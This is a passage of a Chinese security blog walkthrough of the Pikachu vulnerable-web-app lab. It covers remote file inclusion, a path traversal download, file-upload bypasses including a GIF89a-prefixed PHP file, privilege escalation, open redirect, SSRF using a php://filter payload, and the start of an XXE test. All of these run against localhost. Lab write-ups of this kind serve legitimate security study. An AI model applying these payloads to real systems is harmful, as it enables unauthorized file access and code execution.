<h3 class="anchor anchorWithStickyNavbar_LWe7" id="远程文件包含">远程文件包含<a href="#远程文件包含" class="hash-link" aria-label="远程文件包含的直接链接" title="远程文件包含的直接链接">​</a></h3>
<p>可以通过url地址对远程的文件进行包含</p>
<p>php中有几个文件包含函数</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">include(),include_once()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require(),require_once()</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以在url中输入网址</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153935437.png" alt="image-20230812153935437" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153959732.png" alt="image-20230812153959732" class="img_ev3q"></p>
<p>还可以通过url的形式读取文件</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154125229.png" alt="image-20230812154125229" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="不安全的文件下载">不安全的文件下载<a href="#不安全的文件下载" class="hash-link" aria-label="不安全的文件下载的直接链接" title="不安全的文件下载的直接链接">​</a></h2>
<p>这是下载文件的url</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154349392.png" alt="image-20230812154349392" class="img_ev3q"></p>
<p>如果后端没有进行文件名过滤，我们可以直接再filename下载服务器上的任意文件，通过目录遍历。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../1.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="不安全的文件上传">不安全的文件上传<a href="#不安全的文件上传" class="hash-link" aria-label="不安全的文件上传的直接链接" title="不安全的文件上传的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="客户端check">客户端check<a href="#客户端check" class="hash-link" aria-label="客户端check的直接链接" title="客户端check的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154954700.png" alt="image-20230812154954700" class="img_ev3q"></p>
<p>查看源码</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812155401123.png" alt="image-20230812155401123" class="img_ev3q"></p>
<p>发现是前端校验，我们可以禁用js，然后就可以上传.php的文件</p>
<p>还可以利用抓包改后缀名</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="服务端check">服务端check<a href="#服务端check" class="hash-link" aria-label="服务端check的直接链接" title="服务端check的直接链接">​</a></h3>
<p>我们可以上传图片，Content-Type: image/png</p>
<p>只需要将后缀名修改成php就行了。也可以上传php文件进行抓包，修改Content-Type。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="getimagesize">getimagesize()<a href="#getimagesize" class="hash-link" aria-label="getimagesize()的直接链接" title="getimagesize()的直接链接">​</a></h3>
<p>getimagesize()：它是php提供的，通过对目标文件的16进制进行读取，通过该文件的前面几个字符串，来判断文件类型。</p>
<p>我们可以伪造文件头</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812163754016.png" alt="image-20230812163754016" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GIF89a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php phpinfo(); ?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="越权漏洞">越权漏洞<a href="#越权漏洞" class="hash-link" aria-label="越权漏洞的直接链接" title="越权漏洞的直接链接">​</a></h2>
<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作， 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="水平越权">水平越权<a href="#水平越权" class="hash-link" aria-label="水平越权的直接链接" title="水平越权的直接链接">​</a></h3>
<p>用户本身可以修改别的用户的信息</p>
<p>url中的username是lucy，我们可以修改成lili</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164129473.png" alt="image-20230812164129473" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164311056.png" alt="image-20230812164311056" class="img_ev3q"></p>
<p>直接跳转到lili的页面，这叫做水平越权</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="垂直越权">垂直越权<a href="#垂直越权" class="hash-link" aria-label="垂直越权的直接链接" title="垂直越权的直接链接">​</a></h3>
<p>用户可以拥有管理员的权限，对用户信息进行添加</p>
<p>我们先登管理员账号，得到添加信息的url</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后退出管理员账号，登录用户账号，访问这个url，依旧可以进行添加用户，这叫垂直越权。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="url重定向">URL重定向<a href="#url重定向" class="hash-link" aria-label="URL重定向的直接链接" title="URL重定向的直接链接">​</a></h2>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">127.0.0.1/pikachu/vul/urlredirect/urlredirect.php?url=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以在参数后面直接输入网站进行跳转</p>
<p>url跳转的危害：</p>
<p>钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ssrf服务器端请求伪造">SSRF(服务器端请求伪造)<a href="#ssrf服务器端请求伪造" class="hash-link" aria-label="SSRF(服务器端请求伪造)的直接链接" title="SSRF(服务器端请求伪造)的直接链接">​</a></h2>
<p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PHP中下面函数的使用不当会导致SSRF:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file_get_contents()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fsockopen()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl_exec()</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssrfcurl">SSRF(curl)<a href="#ssrfcurl" class="hash-link" aria-label="SSRF(curl)的直接链接" title="SSRF(curl)的直接链接">​</a></h3>
<p>查看源码，利用的是curl_exec()函数</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813172942275.png" alt="image-20230813172942275" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssrffile_get_contents">SSRF(file_get_contents)<a href="#ssrffile_get_contents" class="hash-link" aria-label="SSRF(file_get_contents)的直接链接" title="SSRF(file_get_contents)的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173249389.png" alt="image-20230813173249389" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/convert.base64-encode/resource=ssrf.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173410632.png" alt="image-20230813173410632" class="img_ev3q"></p>
<p>利用伪协议进行读取文件内容</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="xxexml外部实体注入">XXE(xml外部实体注入)<a href="#xxexml外部实体注入" class="hash-link" aria-label="XXE(xml外部实体注入)的直接链接" title="XXE(xml外部实体注入)的直接链接">​</a></h2>
<p>xml是可扩展标记语言</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?xml version=&quot;1.0&quot;?&gt; //声明是xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt; //外部实体声明</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;note&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;to&gt;Dave&lt;/to&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;from&gt; Tom&lt;/from&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;head&gt; Reminder &lt;/head&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;body&gt;You are a good man&lt;/body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/note&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>判断是否有xxe回显漏洞</p>
<p>输入</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;aa&gt;aa&lt;/aa&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813180132480.png" alt="image-20230813180132480" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/靶场/pikachu.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/靶场"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">靶场</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/CTF/Misc/靶场/sqli-labs"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">sqli-labs</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#暴力破解" class="table-of-contents__link toc-highlight">暴力破解</a><ul><li><a href="#基于表单的暴力破解" class="table-of-contents__link toc-highlight">基于表单的暴力破解</a></li><li><a href="#验证码绕过on-server" class="table-of-contents__link toc-highlight">验证码绕过(on server)</a></li><li><a href="#验证码绕过on-client" class="table-of-contents__link toc-highlight">验证码绕过(on client)</a></li><li><a href="#token防爆破" class="table-of-contents__link toc-highlight">token防爆破?</a></li></ul></li><li><a href="#跨站脚本攻击xss" class="table-of-contents__link toc-highlight">跨站脚本攻击(xss)</a><ul><li><a href="#反射型xssget" class="table-of-contents__link toc-highlight">反射型XSS(get)</a></li><li><a href="#反射型xsspost" class="table-of-contents__link toc-highlight">反射型XSS(post)</a></li><li><a href="#存储型xss" class="table-of-contents__link toc-highlight">存储型XSS</a></li><li><a href="#dom型xss" class="table-of-contents__link toc-highlight">DOM型xss</a></li><li><a href="#dom型xss-x" class="table-of-contents__link toc-highlight">DOM型xss-x</a></li><li><a href="#xss盲打" class="table-of-contents__link toc-highlight">XSS盲打</a></li><li><a href="#xss之过滤" class="table-of-contents__link toc-highlight">XSS之过滤</a></li><li><a href="#xss之htmlspecialchars函数" class="table-of-contents__link toc-highlight">xss之htmlspecialchars()函数</a></li><li><a href="#xss之href输出和js输出" class="table-of-contents__link toc-highlight">xss之href输出和js输出</a></li><li><a href="#xss的危害" class="table-of-contents__link toc-highlight">xss的危害</a></li></ul></li><li><a href="#csrf跨站请求伪造" class="table-of-contents__link toc-highlight">CSRF(跨站请求伪造)</a><ul><li><a href="#概述" class="table-of-contents__link toc-highlight">概述</a></li><li><a href="#csrfgetpost" class="table-of-contents__link toc-highlight">CSRF(get/post)</a></li><li><a href="#csrftoken" class="table-of-contents__link toc-highlight">CSRF(Token)</a></li></ul></li><li><a href="#sql注入" class="table-of-contents__link toc-highlight">SQL注入</a><ul><li><a href="#概述-1" class="table-of-contents__link toc-highlight">概述</a></li><li><a href="#数字型注入" class="table-of-contents__link toc-highlight">数字型注入</a></li><li><a href="#字符型注入" class="table-of-contents__link toc-highlight">字符型注入</a></li><li><a href="#搜索型注入" class="table-of-contents__link toc-highlight">搜索型注入</a></li><li><a href="#insertupdate注入" class="table-of-contents__link toc-highlight">insert/update注入</a></li><li><a href="#delete注入" class="table-of-contents__link toc-highlight">delete注入</a></li><li><a href="#http-header-注入" class="table-of-contents__link toc-highlight">http header 注入</a></li><li><a href="#基于boolian的盲注" class="table-of-contents__link toc-highlight">基于boolian的盲注</a></li><li><a href="#基于时间的盲注" class="table-of-contents__link toc-highlight">基于时间的盲注</a></li><li><a href="#宽字节注入wide-byte注入" class="table-of-contents__link toc-highlight">宽字节注入(wide byte注入)</a></li></ul></li><li><a href="#rce" class="table-of-contents__link toc-highlight">RCE</a><ul><li><a href="#execping" class="table-of-contents__link toc-highlight">exec“ping”</a></li><li><a href="#execevel" class="table-of-contents__link toc-highlight">exec“evel”</a></li></ul></li><li><a href="#文件包含漏洞" class="table-of-contents__link toc-highlight">文件包含漏洞</a><ul><li><a href="#本地文件包含" class="table-of-contents__link toc-highlight">本地文件包含</a></li><li><a href="#远程文件包含" class="table-of-contents__link toc-highlight">远程文件包含</a></li></ul></li><li><a href="#不安全的文件下载" class="table-of-contents__link toc-highlight">不安全的文件下载</a></li><li><a href="#不安全的文件上传" class="table-of-contents__link toc-highlight">不安全的文件上传</a><ul><li><a href="#客户端check" class="table-of-contents__link toc-highlight">客户端check</a></li><li><a href="#服务端check" class="table-of-contents__link toc-highlight">服务端check</a></li><li><a href="#getimagesize" class="table-of-contents__link toc-highlight">getimagesize()</a></li></ul></li><li><a href="#越权漏洞" class="table-of-contents__link toc-highlight">越权漏洞</a><ul><li><a href="#水平越权" class="table-of-contents__link toc-highlight">水平越权</a></li><li><a href="#垂直越权" class="table-of-contents__link toc-highlight">垂直越权</a></li></ul></li><li><a href="#url重定向" class="table-of-contents__link toc-highlight">URL重定向</a></li><li><a href="#ssrf服务器端请求伪造" class="table-of-contents__link toc-highlight">SSRF(服务器端请求伪造)</a><ul><li><a href="#ssrfcurl" class="table-of-contents__link toc-highlight">SSRF(curl)</a></li><li><a href="#ssrffile_get_contents" class="table-of-contents__link toc-highlight">SSRF(file_get_contents)</a></li></ul></li><li><a href="#xxexml外部实体注入" class="table-of-contents__link toc-highlight">XXE(xml外部实体注入)</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Blog, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>